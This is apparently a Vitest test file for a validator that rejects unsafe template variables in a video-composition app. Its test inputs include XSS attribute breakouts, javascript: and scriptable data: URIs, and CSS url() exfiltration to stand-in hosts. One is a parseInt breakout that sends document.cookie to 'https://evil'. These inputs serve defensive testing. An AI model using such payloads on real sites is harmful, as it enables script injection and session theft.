import { describe, expect, it } from "vitest";
import {
  findUnsafeCompositionVar,
  assertSafeCompositionVars,
  isSafeCssColor,
  UnsafeCompositionVarError,
} from "./compositionVars";

describe("findUnsafeCompositionVar — URL/attribute keys", () => {
  it("rejects a brand.logoUrl that breaks out of the src=\"…\" attribute", () => {
    const violation = findUnsafeCompositionVar({
      "brand.logoUrl": 'https://x/y.png" onerror="alert(1)',
    });
    expect(violation?.key).toBe("brand.logoUrl");
  });

  it("rejects non-http(s) brand.logoUrl schemes", () => {
    expect(
      findUnsafeCompositionVar({ "brand.logoUrl": "javascript:alert(1)" })?.key,
    ).toBe("brand.logoUrl");
    // A data: URI is NOT acceptable for the plain-URL logo key.
    expect(
      findUnsafeCompositionVar({
        "brand.logoUrl": "data:image/png;base64,AAAA",
      })?.key,
    ).toBe("brand.logoUrl");
  });

  it("accepts a clean http(s) brand.logoUrl", () => {
    expect(
      findUnsafeCompositionVar({
        "brand.logoUrl": "https://cdn.example.com/logo.png",
      }),
    ).toBeNull();
  });

  it("rejects a capture.image that breaks out of the src=\"…\" attribute", () => {
    expect(
      findUnsafeCompositionVar({
        "capture.image": 'x" onerror="alert(1)',
      })?.key,
    ).toBe("capture.image");
  });

  it("rejects a non-image / scriptable data URI for capture.image", () => {
    expect(
      findUnsafeCompositionVar({
        "capture.image": "data:text/html,<script>alert(1)</script>",
      })?.key,
    ).toBe("capture.image");
    // SVG can carry markup, so it is not an allowed image data URI subtype.
    expect(
      findUnsafeCompositionVar({
        "capture.image": "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=",
      })?.key,
    ).toBe("capture.image");
  });

  it("accepts the website→video screenshot data URI (image/png;base64)", () => {
    // The exact shape websiteToVideoService produces.
    const dataUri =
      "data:image/png;base64," +
      Buffer.from("not-a-real-png").toString("base64");
    expect(
      findUnsafeCompositionVar({ "capture.image": dataUri }),
    ).toBeNull();
  });

  it("accepts an http(s) URL for capture.image", () => {
    expect(
      findUnsafeCompositionVar({
        "capture.image": "https://cdn.example.com/shot.png",
      }),
    ).toBeNull();
  });

  // ai.backgroundImage shares capture.image's "image" kind: the AI image
  // generator writes a data URI here, and it is user-overridable via ?vars=, so
  // it must be held to the same attribute-breakout / data-URI-subtype gate.
  it("rejects an ai.backgroundImage that breaks out of the src=\"…\" attribute", () => {
    expect(
      findUnsafeCompositionVar({
        "ai.backgroundImage": 'x" onerror="alert(1)',
      })?.key,
    ).toBe("ai.backgroundImage");
  });

  it("rejects a non-image / scriptable data URI for ai.backgroundImage", () => {
    expect(
      findUnsafeCompositionVar({
        "ai.backgroundImage": "data:text/html,<script>alert(1)</script>",
      })?.key,
    ).toBe("ai.backgroundImage");
    expect(
      findUnsafeCompositionVar({
        "ai.backgroundImage": "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=",
      })?.key,
    ).toBe("ai.backgroundImage");
  });

  it("accepts the generator's jpeg/png/webp data URI for ai.backgroundImage", () => {
    const b64 = Buffer.from("not-a-real-image").toString("base64");
    expect(
      findUnsafeCompositionVar({ "ai.backgroundImage": `data:image/jpeg;base64,${b64}` }),
    ).toBeNull();
    expect(
      findUnsafeCompositionVar({ "ai.backgroundImage": `data:image/webp;base64,${b64}` }),
    ).toBeNull();
    // Empty = "unset" (composition's img.ai-bg[src=""] collapses it).
    expect(findUnsafeCompositionVar({ "ai.backgroundImage": "" })).toBeNull();
  });
});

describe("findUnsafeCompositionVar — object-reference keys", () => {
  // ai.backgroundObject is server-managed (set by POST /projects/:id/ai-image)
  // and read server-side to fetch the stored image; constrain it to the shapes
  // the resolver accepts so a PATCH/?vars override can't smuggle something else.
  it("accepts the local sentinel, an /objects path, and empty", () => {
    expect(
      findUnsafeCompositionVar({ "ai.backgroundObject": "local" }),
    ).toBeNull();
    expect(
      findUnsafeCompositionVar({
        "ai.backgroundObject": "/objects/uploads/abc-123",
      }),
    ).toBeNull();
    expect(findUnsafeCompositionVar({ "ai.backgroundObject": "" })).toBeNull();
    // capture.imageObject (website→video screenshot) shares the same gate.
    expect(
      findUnsafeCompositionVar({ "capture.imageObject": "/objects/uploads/x" }),
    ).toBeNull();
    expect(
      findUnsafeCompositionVar({ "capture.imageObject": "local" }),
    ).toBeNull();
  });

  it("rejects a non-/objects reference (e.g. a scheme or breakout)", () => {
    expect(
      findUnsafeCompositionVar({
        "ai.backgroundObject": "javascript:alert(1)",
      })?.key,
    ).toBe("ai.backgroundObject");
    expect(
      findUnsafeCompositionVar({
        "ai.backgroundObject": '/objects/x" onerror="y',
      })?.key,
    ).toBe("ai.backgroundObject");
    expect(
      findUnsafeCompositionVar({ "ai.backgroundObject": "/etc/passwd" })?.key,
    ).toBe("ai.backgroundObject");
  });
});

describe("findUnsafeCompositionVar — color keys", () => {
  it("rejects a color that injects a CSS url() for exfiltration", () => {
    expect(
      findUnsafeCompositionVar({
        "brand.primaryColor": "red;background:url(https://evil.example/x)",
      })?.key,
    ).toBe("brand.primaryColor");
  });

  it("rejects a color that closes the style block / injects markup", () => {
    expect(
      findUnsafeCompositionVar({
        "brand.accentColor": "#fff</style><script>alert(1)</script>",
      })?.key,
    ).toBe("brand.accentColor");
  });

  it("accepts hex and functional colors for every color key", () => {
    expect(
      findUnsafeCompositionVar({
        "brand.primaryColor": "#6366f1",
        "brand.secondaryColor": "rgb(30, 41, 59)",
        "brand.accentColor": "hsl(38 92% 50%)",
      }),
    ).toBeNull();
  });
});

describe("isSafeCssColor", () => {
  it("allows empty / unset (composition falls back to a default)", () => {
    expect(isSafeCssColor("")).toBe(true);
    expect(isSafeCssColor(null)).toBe(true);
    expect(isSafeCssColor(undefined)).toBe(true);
  });

  it("allows 3/4/6/8-digit hex", () => {
    expect(isSafeCssColor("#fff")).toBe(true);
    expect(isSafeCssColor("#ffff")).toBe(true);
    expect(isSafeCssColor("#6366f1")).toBe(true);
    expect(isSafeCssColor("#6366f1aa")).toBe(true);
  });

  it("rejects malformed hex lengths and non-hex digits", () => {
    expect(isSafeCssColor("#ff")).toBe(false);
    expect(isSafeCssColor("#fffff")).toBe(false);
    expect(isSafeCssColor("#gggggg")).toBe(false);
  });

  it("allows rgb/rgba/hsl/hsla with numeric args only", () => {
    expect(isSafeCssColor("rgb(0,0,0)")).toBe(true);
    expect(isSafeCssColor("rgba(0, 0, 0, 0.5)")).toBe(true);
    expect(isSafeCssColor("hsl(210, 50%, 40%)")).toBe(true);
    expect(isSafeCssColor("hsla(210 50% 40% / 50%)")).toBe(true);
  });

  it("rejects functions carrying url() / extra declarations / quotes", () => {
    expect(isSafeCssColor("rgb(0,0,0);x:url(/y)")).toBe(false);
    expect(isSafeCssColor("var(--x)")).toBe(false);
    expect(isSafeCssColor("url(https://evil/x)")).toBe(false);
    expect(isSafeCssColor("red")).toBe(false); // named colors not in scope
  });
});

describe("findUnsafeCompositionVar — numeric keys (JS-string / attribute XSS)", () => {
  // Regression for the audit finding: these keys land in
  // parseInt("{{capture.height}}") / parseFloat("{{duration}}") JS string
  // literals and data-duration="{{duration}}" attributes, where escapeMarkup
  // does NOT escape the closing quote — so a `"` breaks out and injects script.
  it("rejects the exact parseInt() JS-string breakout payload", () => {
    expect(
      findUnsafeCompositionVar({
        "capture.height": `1")||fetch('https://evil/?c='+document.cookie)||("`,
      })?.key,
    ).toBe("capture.height");
  });

  it("rejects a duration that breaks out of the JS string / data-duration attr", () => {
    expect(
      findUnsafeCompositionVar({ duration: `9");alert(document.domain)//` })?.key,
    ).toBe("duration");
    expect(
      findUnsafeCompositionVar({ duration: `9" onload="alert(1)` })?.key,
    ).toBe("duration");
  });

  it("rejects crop fractions and layout dimensions that carry a quote", () => {
    expect(
      findUnsafeCompositionVar({ "capture.cropX": `0");alert(1)//` })?.key,
    ).toBe("capture.cropX");
    expect(
      findUnsafeCompositionVar({ "layout.width": `1080"><script>` })?.key,
    ).toBe("layout.width");
  });

  it("rejects a sorrel.transitionsActive that breaks out of its quoted compare", () => {
    expect(
      findUnsafeCompositionVar({
        "sorrel.transitionsActive": `1";alert(1);("`,
      })?.key,
    ).toBe("sorrel.transitionsActive");
  });

  it("accepts the plain numbers the real producers emit", () => {
    // The exact shapes websiteToVideoService / buildCropVars / talkingHost emit.
    expect(
      findUnsafeCompositionVar({
        duration: "9",
        "capture.height": "9000",
        "capture.cropX": "0",
        "capture.cropY": "0.25",
        "capture.cropW": "1",
        "capture.cropH": "0.5",
        "layout.width": "1080",
        "layout.height": "1920",
        "sorrel.transitionsActive": "1",
      }),
    ).toBeNull();
    // Empty is "unset" — allowed like the color/url keys.
    expect(findUnsafeCompositionVar({ duration: "" })).toBeNull();
  });
});

describe("findUnsafeCompositionVar — token & font keys", () => {
  it("rejects a layout.aspect that breaks out of the JS string / attribute", () => {
    expect(
      findUnsafeCompositionVar({ "layout.aspect": `portrait";alert(1)//` })?.key,
    ).toBe("layout.aspect");
    expect(
      findUnsafeCompositionVar({ "layout.aspect": `x" onload="y` })?.key,
    ).toBe("layout.aspect");
  });

  it("accepts the real aspect enum values", () => {
    expect(
      findUnsafeCompositionVar({ "layout.aspect": "portrait" }),
    ).toBeNull();
    expect(
      findUnsafeCompositionVar({ "layout.aspect": "landscape" }),
    ).toBeNull();
    expect(findUnsafeCompositionVar({ "layout.aspect": "square" })).toBeNull();
  });

  it("rejects a brand.fontFamily override that injects CSS (the brand-write gate is bypassed via compositionVars)", () => {
    expect(
      findUnsafeCompositionVar({
        "brand.fontFamily": `Inter; } body { background: url(https://evil/?c=x) } .z {`,
      })?.key,
    ).toBe("brand.fontFamily");
    expect(
      findUnsafeCompositionVar({
        "brand.fontFamily": `Inter'; background:url(x)`,
      })?.key,
    ).toBe("brand.fontFamily");
  });

  it("accepts plain font names (including a space)", () => {
    expect(
      findUnsafeCompositionVar({ "brand.fontFamily": "Inter" }),
    ).toBeNull();
    expect(
      findUnsafeCompositionVar({ "brand.fontFamily": "Space Grotesk" }),
    ).toBeNull();
  });
});

describe("findUnsafeCompositionVar — pass-through", () => {
  it("leaves non-constrained keys (text-content placeholders) alone", () => {
    // These land in HTML text content and are markup-escaped by the template;
    // the validator must not reject them.
    expect(
      findUnsafeCompositionVar({
        "user.headline": 'Quotes "and" <brackets> & ampersands are fine here',
        "capture.url": "https://example.com/<not-a-real-tag>",
        "capture.title": "My <b>Title</b>",
      }),
    ).toBeNull();
  });

  it("ignores non-string and empty values", () => {
    expect(
      findUnsafeCompositionVar({
        "brand.logoUrl": "",
        "brand.primaryColor": 123 as unknown as string,
      }),
    ).toBeNull();
  });

  it("returns null for null / undefined maps", () => {
    expect(findUnsafeCompositionVar(null)).toBeNull();
    expect(findUnsafeCompositionVar(undefined)).toBeNull();
  });
});

describe("assertSafeCompositionVars", () => {
  it("throws UnsafeCompositionVarError on the first violation", () => {
    expect(() =>
      assertSafeCompositionVars({
        "brand.logoUrl": 'https://x/y.png" onerror="alert(1)',
      }),
    ).toThrow(UnsafeCompositionVarError);
  });

  it("does not throw for a safe map", () => {
    expect(() =>
      assertSafeCompositionVars({
        "brand.logoUrl": "https://cdn.example.com/logo.png",
        "brand.primaryColor": "#6366f1",
      }),
    ).not.toThrow();
  });
});
